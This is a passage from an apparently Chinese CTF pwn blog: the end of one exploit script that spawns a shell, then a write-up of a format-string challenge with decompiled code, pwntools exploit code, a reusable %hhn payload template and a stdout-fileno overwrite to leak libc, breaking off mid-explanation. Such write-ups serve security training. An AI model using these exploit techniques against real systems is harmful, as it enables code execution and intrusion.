class="string">&quot;.&quot;</span></span><br><span class="line"><span class="comment">#payload +=&quot;/&lt;//&lt;/&lt;/&lt;/&lt;//////&lt;///&lt;///&lt;/&lt;&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Code: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;/bin&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;\x00sys&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;tem\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;\x00rea&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;d\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;\xa0&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Guess the Number: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>小结：</strong></p>
<p>这个题我看着就像强网杯的 qwarmup，都是任意写 libc，然后打 <code>_dl_runtime_resolve</code></p>
<p>当时猪脑过载了，就想用 qwarmup 的方法来套这个题，调了半天才发现这个题没有开沙盒，可以直接 get shell（唉）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/24/print%E7%9B%B2%E6%89%93%E5%8D%B0+%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A8%A1%E6%9D%BF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/24/print%E7%9B%B2%E6%89%93%E5%8D%B0+%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A8%A1%E6%9D%BF/" class="post-title-link" itemprop="url">print盲打印+格式化漏洞模板</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-24 23:07:07 / Modified: 23:11:09" itemprop="dateCreated datePublished" datetime="2022-08-24T23:07:07+08:00">2022-08-24</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>one 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.7</span>_amd64/ld<span class="number">-2.31</span>.so, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">8024</span>ac0d4b0ace622bc53363057c78623d729080, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000142</span>  <span class="keyword">if</span> (A == execveat) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>有沙盒</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">2056</span>]; <span class="comment">// [rsp+0h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+808h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gift:%p\n&quot;</span>, s);</span><br><span class="line">  login();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, you can&#x27;t see anything!!!&quot;</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(s); <span class="comment">/* fmt */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>白给 stack_base</li>
<li>明显的格式化字符串漏洞，但是 <code>close(1)</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> password[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(name, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(password, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;username:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;password:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, password, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, name);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>写满 name 可以泄露 pro_base，绕过 PIE</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>我们先介绍一个 pwntools 工具：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset, writes, numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个参数表示格式化字符串的偏移</li>
<li>第二个参数表示需要利用 %n 写入的数据，采用字典形式<ul>
<li>将 printf 的 GOT 数据改为 system 函数地址</li>
<li>写法为：<code>&#123;printfGOT:systemAddress&#125;</code> </li>
</ul>
</li>
<li>第三个参数表示已经输出的字符个数</li>
<li>第四个参数表示写入方式<ul>
<li>是按字节（byte-&gt;hhn）双字节（short-&gt;hn）还是四字节（int-&gt;n）</li>
<li>默认值是 byte，即按 hhn 写</li>
</ul>
</li>
<li>fmtstr_payload 函数返回的就是 payload</li>
</ul>
<p>我们断点到 <code>printf</code> 执行处：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x562c1b0674b9</span>    call   <span class="built_in">printf</span>@plt                &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">       format: <span class="number">0x7fff2a2d31c0</span> ◂— <span class="string">&#x27;aaaaaaaa&#x27;</span></span><br><span class="line">       vararg: <span class="number">0x7fff2a2d31c0</span> ◂— <span class="string">&#x27;aaaaaaaa&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">100</span>:<span class="number">0800</span>│     <span class="number">0x7fff2a2d39c0</span> —▸ <span class="number">0x7fff2a2d3ac0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">101</span>:<span class="number">0808</span>│     <span class="number">0x7fff2a2d39c8</span> ◂— <span class="number">0xcf2ec36e5e9ffe00</span></span><br><span class="line"><span class="number">102</span>:<span class="number">0810</span>│ rbp <span class="number">0x7fff2a2d39d0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">103</span>:<span class="number">0818</span>│     <span class="number">0x7fff2a2d39d8</span> —▸ <span class="number">0x7f9168f2f083</span> (__libc_start_main+<span class="number">243</span>) ◂— mov    edi, eax</span><br><span class="line"><span class="number">104</span>:<span class="number">0820</span>│     <span class="number">0x7fff2a2d39e0</span> —▸ <span class="number">0x7f9169164620</span> (_rtld_global_ro) ◂— <span class="number">0x50f2700000000</span></span><br><span class="line"><span class="number">105</span>:<span class="number">0828</span>│     <span class="number">0x7fff2a2d39e8</span> —▸ <span class="number">0x7fff2a2d3ac8</span> —▸ <span class="number">0x7fff2a2d5317</span> ◂— <span class="number">0x4244006e77702f2e</span> <span class="comment">/* &#x27;./pwn&#x27; */</span></span><br><span class="line"><span class="number">106</span>:<span class="number">0830</span>│     <span class="number">0x7fff2a2d39f0</span> ◂— <span class="number">0x100000000</span></span><br><span class="line"><span class="number">107</span>:<span class="number">0838</span>│     <span class="number">0x7fff2a2d39f8</span> —▸ <span class="number">0x562c1b06740b</span> ◂— endbr64 </span><br></pre></td></tr></table></figure>
<ul>
<li>如果这里直接覆盖 <code>__libc_start_main+243</code> 的话，会导致程序的栈帧出问题，并且没有什么用（因为每次覆盖都需要一次 fmt，程序循环后又必须要 fmt 才能继续循环）</li>
<li>于是我们瞄准 <code>printf</code> 的内部进行覆盖</li>
</ul>
<p>在 <code>printf</code> 中，真正执行 “%n” 覆盖的函数是 <code>buffered_vfprintf</code>，调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> -&gt; __vfprintf_internal -&gt; buffered_vfprintf</span><br></pre></td></tr></table></figure>
<ul>
<li>如果我们利用 <code>buffered_vfprintf</code> 来覆盖 <code>__vfprintf_internal</code> 的返回地址为 start_addr，就可以在 <code>printf</code> 函数内部实现循环</li>
<li>我们可以利用 <code>printf</code> 间接任意写来覆盖这里</li>
</ul>
<p>测试代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(r.recvline(),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;stack: &quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">pie=u64(r.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>)+p16(<span class="number">0</span>))-<span class="number">0x11a0</span></span><br><span class="line">success(<span class="string">&quot;pie: &quot;</span>+<span class="built_in">hex</span>(pie))</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(fmtstr_payload(<span class="number">6</span>, &#123;stack-<span class="number">0xe8</span>:pie+<span class="number">0x11a0</span>&#125;).ljust(<span class="number">0x200</span>,<span class="string">&quot;\x00&quot;</span>)) <span class="comment"># 因为64位程序前6个参数在寄存器中,所以offset设置为&#x27;6&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>GDB 跟踪：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f66e4605d1f</span> &lt;__vfprintf_internal+<span class="number">1215</span>&gt;    call   buffered_vfprintf                &lt;buffered_vfprintf&gt;</span><br><span class="line">       rdi: <span class="number">0x7f66e477c6a0</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line">       rsi: <span class="number">0x7ffe04f611d0</span> ◂— <span class="number">0x3531256330363125</span> (<span class="string">&#x27;%160c%15&#x27;</span>)</span><br><span class="line">       rdx: <span class="number">0x7ffe04f610f0</span> ◂— <span class="number">0x3000000008</span></span><br><span class="line">       rcx: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>修改前：（<code>__vfprintf_internal</code> 的返回地址）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffe04f611d0</span><span class="number">-0xe8</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│         <span class="number">0x7ffe04f610e8</span> —▸ <span class="number">0x7f66e45f0d3f</span> (<span class="built_in">printf</span>+<span class="number">175</span>) ◂— mov    rcx, qword ptr [rsp + <span class="number">0x18</span></span><br></pre></td></tr></table></figure>
<ul>
<li>修改后：（覆盖为 main_addr）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffe04f611d0</span><span class="number">-0xe8</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0x7ffe04f610e8</span> —▸ <span class="number">0x55669931c1a0</span> ◂— endbr64 </span><br></pre></td></tr></table></figure>
<p>因为程序会 <code>close(1)</code>，所以不能直接用 <code>printf(%p)</code> 来泄露 libc_base，但是在我们用 main 覆盖 <code>__vfprintf_internal</code> 的返回地址后，其参数 <code>_IO_2_1_stdout_</code> 指针残留在栈上（如果我们直接覆盖 main 的返回地址，就没有这样的效果）</p>
<p>我们可以利用这个指针修改 <code>_IO_2_1_stdout_-&gt;fileno</code> 为 “2” 重新获得输出，然后 ORW</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f0e2d3056a0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f0e2d3056a0</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad28a7</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f0e2d3056a8</span> (_IO_2_1_stdout_+<span class="number">8</span>) —▸ <span class="number">0x7f0e2d305723</span> (_IO_2_1_stdout_+<span class="number">131</span>) ◂— <span class="number">0x3067e0000000000a</span> <span class="comment">/* &#x27;\n&#x27; */</span></span><br><span class="line">... ↓     <span class="number">6</span> skipped</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x7f0e2d3056e0</span> (_IO_2_1_stdout_+<span class="number">64</span>) —▸ <span class="number">0x7f0e2d305724</span> (_IO_2_1_stdout_+<span class="number">132</span>) ◂— <span class="number">0x2d3067e000000000</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x7f0e2d3056e8</span> (_IO_2_1_stdout_+<span class="number">72</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x7f0e2d305708</span> (_IO_2_1_stdout_+<span class="number">104</span>) —▸ <span class="number">0x7f0e2d304980</span> (_IO_2_1_stdin_) ◂— <span class="number">0xfbad208b</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x7f0e2d305710</span> (_IO_2_1_stdout_+<span class="number">112</span>) ◂— <span class="number">0x1</span> <span class="comment">/* target */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x7f0e2d305718</span> (_IO_2_1_stdout_+<span class="number">120</span>) ◂— <span class="number">0xffffffffffffffff</span></span><br></pre></td></tr></table></figure>
<ul>
<li>我们需要先把 <code>_IO_2_1_stdout_</code> 修改为 <code>_IO_2_1_stdout_+112</code> 然后再改 <code>fileno</code></li>
<li>注意：<code>_IO_2_1_stdout_+112</code> 的倒数第2字节需要爆破，每次都有 1/16 的概率</li>
</ul>
<p>因为我们只覆盖最后4字节，所以 fmtstr_payload 不能使用，不过我在这里给出一个专门覆盖低4字节的 fmt 模板：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">bit=random.randint(<span class="number">1</span>,<span class="number">15</span>)*<span class="number">0x10</span>+<span class="string">&quot;[offset]&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bit))</span><br><span class="line"><span class="keyword">if</span> (bit-<span class="number">0x10</span>&lt;<span class="number">0</span>): </span><br><span class="line">    bit=bit+<span class="number">0xf0</span></span><br><span class="line">off=[<span class="string">&quot;[last]&quot;</span>,bit+<span class="string">&quot;(1)&quot;</span>]</span><br><span class="line">ptr=[<span class="string">&quot;[stack]&quot;</span>,<span class="string">&quot;[stack+1]&quot;</span>]</span><br><span class="line"></span><br><span class="line">pre=<span class="number">0</span></span><br><span class="line">fmt=<span class="string">&quot;&quot;</span></span><br><span class="line">data=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ptr:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> step <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    min_num=<span class="number">0xFFFF</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(off)):</span><br><span class="line">        <span class="keyword">if</span> (off[i]&lt;min_num):</span><br><span class="line">            min_num=off[i]</span><br><span class="line">            min_idx=i</span><br><span class="line">    fmt+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(min_num-pre)+<span class="string">&quot;c%&quot;</span>+<span class="built_in">str</span>(step+<span class="string">&quot;[index]&quot;</span>)+<span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    data+=p64(ptr[min_idx])</span><br><span class="line">    off[min_idx]=<span class="number">0xFF</span></span><br><span class="line">    pre=min_num</span><br><span class="line"></span><br><span class="line">payload = fmt.ljust(<span class="number">0x80</span>,<span class="string">&quot;\x00&quot;</span>)+data</span><br></pre></td></tr></table></figure>
<ul>
<li><code>[last]</code>：目标地址的最后1字节</li>
<li><code>[offset]</code>：目标地址的倒数第2字节的偏移（<code>bit</code>为倒数第2字节，并且需要爆破）</li>
<li><code>[stack]</code>：位于 stack 上的指针，指向将要被修改的地址（间接修改）</li>
<li><code>[index]</code>：格式化字符串的偏移（可以用 <code>fmtarg</code> 命令快速获取）</li>
</ul>
<p>由于程序需要在覆盖 <code>_IO_2_1_stdout_</code> 最后两字节的同时，修改 main 的返回地址为 main，所以对这个模板做了些改动：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">start=pie+<span class="number">0x11a0</span></span><br><span class="line">bit=random.randint(<span class="number">1</span>,<span class="number">15</span>)*<span class="number">0x10</span>+<span class="number">0x6</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bit))</span><br><span class="line"><span class="keyword">if</span> (bit-<span class="number">0x10</span>&lt;<span class="number">0</span>): </span><br><span class="line">    bit=bit+<span class="number">0xf0</span></span><br><span class="line">off=[<span class="number">0x10</span>,bit+<span class="number">1</span>]</span><br><span class="line">ptr=[stack-<span class="number">0x80</span>,stack-<span class="number">0x7F</span>]</span><br><span class="line"></span><br><span class="line">tmp=start</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    off.append(tmp%<span class="number">0x100</span>)</span><br><span class="line">    ptr.append(stack-<span class="number">0x1c8</span>+i)</span><br><span class="line">    tmp=tmp//<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">pre=<span class="number">0</span></span><br><span class="line">fmt=<span class="string">&quot;&quot;</span></span><br><span class="line">data=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ptr:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> step <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    min_num=<span class="number">0xFFFF</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(off)):</span><br><span class="line">        <span class="keyword">if</span> (off[i]&lt;min_num):</span><br><span class="line">            min_num=off[i]</span><br><span class="line">            min_idx=i</span><br><span class="line">    fmt+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(min_num-pre)+<span class="string">&quot;c%&quot;</span>+<span class="built_in">str</span>(step+<span class="number">22</span>)+<span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    data+=p64(ptr[min_idx])</span><br><span class="line">    off[min_idx]=<span class="number">0xFF</span></span><br><span class="line">    pre=min_num</span><br><span class="line"></span><br><span class="line">r.send((fmt.ljust(<span class="number">0x80</span>,<span class="string">&quot;\x00&quot;</span>)+data).ljust(<span class="number">0x200</span>,<span class="string">&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>当 1/16 的概率爆破成功后，下一次循环的 fmt 就可以修改 <code>_IO_2_1_stdout_-&gt;fileno</code> 为 “2”，然后用 “%p” 就可以泄露出 libc_base</p>
<p>最后就可以通过 buffered_vfprintf 覆盖 printf 的返回地址，把一个特殊的 getget 写入：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add rsp,<span class="number">0x98</span>; ret;  </span><br></pre></td></tr></table></figure>
<ul>
<li>看看 printf 返回时的 stack 空间：</li>
</ul>
